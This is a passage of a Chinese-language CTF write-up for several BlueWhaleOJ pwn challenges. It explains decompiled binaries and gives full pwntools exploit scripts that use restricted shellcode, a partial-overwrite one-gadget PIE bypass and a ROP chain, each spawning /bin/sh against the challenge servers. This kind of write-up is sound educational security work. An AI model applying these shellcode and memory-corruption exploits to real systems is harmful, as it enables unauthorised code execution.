ST64_1</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// ST38_8</span></span><br><span class="line">  <span class="keyword">char</span> *v15; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// ST48_8</span></span><br><span class="line">  <span class="keyword">char</span> *v17; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">4</span>];</span><br><span class="line">  v4 = *(a1 + <span class="number">5</span>);</span><br><span class="line">  v5 = *(a1 + <span class="number">9</span>);</span><br><span class="line">  v6 = a1[<span class="number">17</span>];</span><br><span class="line">  *&amp;v7 = *(a1 + <span class="number">18</span>);</span><br><span class="line">  v8 = <span class="number">0xCC</span>u;</span><br><span class="line">  v9 = <span class="number">0xCC</span>u;</span><br><span class="line">  v10 = <span class="number">0xCC</span>u;</span><br><span class="line">  BYTE8(v7) = <span class="number">0xCC</span>u;</span><br><span class="line">  v11 = clean;</span><br><span class="line">  v12 = qword_202028;</span><br><span class="line">  v13 = qword_202030;</span><br><span class="line">  v14 = qword_202038;</span><br><span class="line">  v15 = qword_202040;</span><br><span class="line">  v16 = qword_202048;</span><br><span class="line">  v17 = mmap(<span class="number">0L</span>L, <span class="number">78u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">  *v17 = v11;</span><br><span class="line">  *(v17 + <span class="number">1</span>) = v12;</span><br><span class="line">  *(v17 + <span class="number">2</span>) = v13;</span><br><span class="line">  *(v17 + <span class="number">3</span>) = v14;</span><br><span class="line">  *(v17 + <span class="number">4</span>) = v15;</span><br><span class="line">  *(v17 + <span class="number">5</span>) = v16;</span><br><span class="line">  *(v17 + <span class="number">6</span>) = *&amp;v2;</span><br><span class="line">  *(v17 + <span class="number">7</span>) = *(&amp;v4 + <span class="number">2</span>);</span><br><span class="line">  *(v17 + <span class="number">8</span>) = *(&amp;v5 + <span class="number">5</span>);</span><br><span class="line">  *(v17 + <span class="number">18</span>) = *(&amp;v7 + <span class="number">3</span>);</span><br><span class="line">  *(v17 + <span class="number">38</span>) = *(&amp;v7 + <span class="number">7</span>);</span><br><span class="line">  (v17)(<span class="number">0L</span>L, <span class="number">78L</span>L);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑就是申请一块可执行的匿名内存，将我们输入的shellcode拼接到一段内置的shellcode<code>\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF</code>后面，这段shellcode翻译成汇编为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xor    rbp,rbp</span><br><span class="line">xor    rsp,rsp</span><br><span class="line">xor    rax,rax</span><br><span class="line">xor    rbx,rbx</span><br><span class="line">xor    rcx,rcx</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdi,rdi</span><br><span class="line">xor    r8,r8</span><br><span class="line">xor    r9,r9</span><br><span class="line">xor    r10,r10</span><br><span class="line">xor    r11,r11</span><br><span class="line">xor    r12,r12</span><br><span class="line">xor    r13,r13</span><br><span class="line">xor    r14,r14</span><br><span class="line">xor    r15,r15</span><br></pre></td></tr></table></figure><p>其作用就是将所有的寄存器清零，这其中包括了rsp和rbp，所以我们用不了栈。不过也有一个好处就是我们shellcode中不需要再将某些寄存器清零了，这就避免了坏字符的出现。之后会将我们提供的shellcode分别在第5，第10，第20，第29个字节前插入0xcc，也就是int3中断，所以我们的shellcode会被分成4段，每段长度为5，4，9，8，而为了避免int3的干扰，我们可以在0xcc前添加0xb2将0xcc吞掉，0xb2cc的汇编为<code>mov dl, 0xcc</code>，因此每段的长度就变成了4，3，8，7。</p><p>最后的目的就是通过syscall系统调用执行命令，但是首先必须找到一块可写并且可读的内存来存放字符串<code>/bin/sh</code>，由于所有的寄存器都清零了，所以我们可以利用的内存就只有存放我们shellcode的那段新申请的内存，所以我们就需要想办法拿到那段内存中某一个地址。</p><p>当所有寄存器都为0时调用syscall，此时相当于<code>read(0, NULL, 0)</code>，执行完成后rcx的内容会变成下一个下一条指令的地址，利用这一点我们就可以拿到这段内存中的地址。</p><p>直接在shellcode中调用execve的syscall是无法起作用的，shellcode中不能出现0x0，所以被写入内存的字符串<code>/bin/sh</code>会与后面的字符串相连，经过测试在最后添加分号也没有办法执行，所以可以换一种思路，调用read的系统调用，然后将新的不受限制的shellcode写入这段内存中，之后再jmp到shellcode处即可，所以第一个shellcode为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; First segment, 4 bytes.</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">; Second segment, 3 bytes.</span><br><span class="line">mov rsi, rcx</span><br><span class="line"></span><br><span class="line">; Third segment, 8 bytes.</span><br><span class="line">sub rsi, 0x32</span><br><span class="line">mov dl, 0x20</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">; Last segment.</span><br><span class="line">jmp rsi</span><br></pre></td></tr></table></figure><p>这里的<code>sub rsi, 0x32</code>可以得到这段内存起始地址，分别用0xb2将每段shellcode连起来，再发送新的shellcode，由于前面的shellcode中的<code>mov dl, 0xcc</code>会改变rdx的值，所以这里需要手动将rdx清零，另外字符串<code>/bin/sh\x00</code>在这段shellcode的最后发送，所以需要<code>add rdi, 0x11</code>跳转到syscall的后面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0x3b</span><br><span class="line">mov rdi, rsi</span><br><span class="line">add rdi, 0x11</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>最终的exp如下，拿到flag为<code>ctf&#123;ar3_y0u_sHelic0de_m4sT3r&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19905</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  b2 cc </span></span><br><span class="line"><span class="comment"># 5 4 9 8</span></span><br><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;\xb2&#x27;</span> + asm(<span class="string">&#x27;mov rsi, rcx&#x27;</span>) + <span class="string">&#x27;\xb2&#x27;</span> + asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub rsi, 0x32</span></span><br><span class="line"><span class="string">mov dl, 0x20</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;\xb2&#x27;</span> + asm(<span class="string">&#x27;jmp rsi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcode.ljust(<span class="number">26</span>, <span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Shellcode: &#x27;</span> + shellcode.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> len(shellcode) == <span class="number">26</span></span><br><span class="line"></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Send me your ride\n&#x27;</span>, shellcode)</span><br><span class="line">conn.send(asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov al, 0x3b</span></span><br><span class="line"><span class="string">mov rdi, rsi</span></span><br><span class="line"><span class="string">add rdi, 0x11</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwneta-200"><a href="#pwneta-200" class="headerlink" title="pwneta(200)"></a>pwneta(200)</h1><p>使用checksec检查一下，发现开启了PIE，所以此题的主要目的就是绕过PIE进行ROP。主要的溢出点为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_868</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">6</span>]; <span class="comment">// [rsp+8h] [rbp-408h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1026</span>]; <span class="comment">// [rsp+Eh] [rbp-402h]</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, &amp;buf[<span class="number">2</span>], <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf[<span class="number">1</span>], <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( buf[<span class="number">1</span>] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *v1 = <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">0</span>, v1, <span class="number">1u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;v1[<span class="number">1</span>], <span class="number">1u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1u</span>LL);</span><br><span class="line">    buf[*v1 + <span class="number">2</span>] = buf[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;So cool.\n&quot;</span>, <span class="number">9u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf的长度为1026，其功能为首先读入1024个字节到buf的后1024位中，前两位空出来，之后循环，首先读取一个字节到buf[1]中，非n的话就读取2个字节到v1中，再读取1个字节到buf[0]中，读取到v1中的字节的值将作为偏移，将读取到的buf[0]的值写入buf中，控制了v1以后我们就可以在很大的范围内任意写入内存。</p><p>由于每次v1最多读两个字节，所以偏移的最大值为0xffff。写入的起始位置在buf[2]，也就是<code>rbp-0x402+2 = rbp-0x400</code>处，为了可以写到rbp，所以我们每次发送的偏移必须加上0x400。</p><p>由于题目中并没有任何puts或pringtf的参数可控（无法控制rdi），所以无法泄漏任何地址，因此为了绕过PIE，只能用Partial Write去改写某个内存中地址的后几个字节。我们所输入的payload在最后sub_868函数执行结束后才会触发，所以我们只能在该函数栈帧后面寻找，并且为了实现one gadget，我们要寻找并且修改的的需要是libc中的地址而不是程序地址，可以看到在rbp+0x238的地方有一个libc main的地址。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/7.png"></p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/8.png"></p><p>该地址将会在函数执行结束后跳转，所以我们要修改的就是这个地址。题目使用的libc位2.27-ubuntu1.2的版本，拿到这个版本的one gadget后在本地加载一个该libc的基址，然后再加上one gadget的偏移，就得到了一个libc的地址，取最后三个字节最为Partial Write的目标。由于每次程序加载的libc基址都会变，但是libc基址的后1.5个字节（也就是3个十六进制数）都是0，所以刚才计算出的那个地址最后1.5个字节肯定是对的，而我们只修改了libc main地址的最后3个字节，所以只剩下1.5个字节是需要靠运气的，其枚举空间为16的3次方也就是4096，脚本一直循环，看运气总有一次可以命中那1.5个字节，脸好的几百次可能就命中，脸黑的可能就得几千次。最终的exp如下，拿到flag<code>ctf&#123;p4rtia!_overwrl73_IS_gre4T&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;campus1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19906</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">start, value</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Wite value to rbp+start.&quot;&quot;&quot;</span></span><br><span class="line">    cur = start</span><br><span class="line">    log.info(<span class="string">&#x27;Sending: &#x27;</span> + value.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> value:</span><br><span class="line">        conn.sendafter(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?\n&quot;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        offset = cur + <span class="number">0x400</span></span><br><span class="line">        <span class="keyword">assert</span> offset &lt;= <span class="number">0xffff</span></span><br><span class="line">        conn.send(p16(offset))</span><br><span class="line">        conn.send(i)</span><br><span class="line">        cur += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">One gadget:</span></span><br><span class="line"><span class="string">    0x4f3c2 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">    constraints:</span></span><br><span class="line"><span class="string">    [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> i,</span><br><span class="line">    conn.sendafter(<span class="string">&#x27;What do you have this time\n&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pwn(<span class="number">0x238</span>, <span class="string">&#x27;\xf1\x83\xc2&#x27;</span>[::<span class="number">-1</span>])</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># gdb.attach(conn)</span></span><br><span class="line">    conn.sendafter(<span class="string">&quot;Changes you&#x27;d like to make (y/n)?\n&quot;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;L8R.\n&#x27;</span>, <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = conn.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">in</span> ret:</span><br><span class="line">            <span class="keyword">print</span> ret</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    conn.close()</span><br><span class="line">    <span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">        conn = remote(HOST, PORT)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        env = &#123;</span><br><span class="line">            <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwntheta-200"><a href="#pwntheta-200" class="headerlink" title="pwntheta(200)"></a>pwntheta(200)</h1><p>此题意义不明，溢出点位于sub_400C58，buf的大小为1032字节，但是会读入2015字节，所以可以造成栈溢出，虽然开启了NX，但是程序是静态编译的，所以有大量的Gadgets可以用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400C58</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-410h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yes?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">2015u</span>LL);</span><br><span class="line">  write(<span class="number">1u</span>, <span class="string">&quot;Whatever\n&quot;</span>, <span class="number">9u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中有一个很奇怪的地方，通过checksec可以看到题目并没有开启canary，但是汇编中却有与canary相关的指令，可以看到函数sub_400B4D中主要是与函数调用的初始化函数相关。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">init</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = read(fd, buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v9 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *v6 = (v6[<span class="number">7</span>] ^ buf[<span class="number">0</span>]) ^ (*v6 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *buf = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8 = buf;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v8 += <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v8 != *buf );</span><br><span class="line">  *v8 = *v6;</span><br><span class="line">  __writefsqword(<span class="number">0x28</span>u, *v6);</span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = v4 ^ v10;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != v10 )</span><br><span class="line">    _check_stack_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数内部首先会打开flag文件，所以本地调试该程序的时候需要在根目录下创建一个空的flag文件。看源码逻辑应该是自己实现了一个canary，这个canary就是加密后的flag前8位，只要flag不变，canary也是一直不变的。但是再看漏洞函数的最后验证canary的时候，不管验证是否通过，都直接jmp，所以不会调用之后的check_stack_fail函数，所以这个程序可能被人patch过忘记改回来了，就直接发布到题目中，导致这道题的canary失效。</p><p><img src="/2020/10/16/BlueWhaleOJ-Pwn-WriteUp-Part1/10.png"></p><p>最后的exp如下，由于canary失效，所以主要原理就是ROP，先调用read的系统调用把<code>/bin/sh</code>写入一个全局变量数组中，之后再调用execve即可，拿到flag为<code>ctf&#123;customiz3d_canary_SHould_b3_proved&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 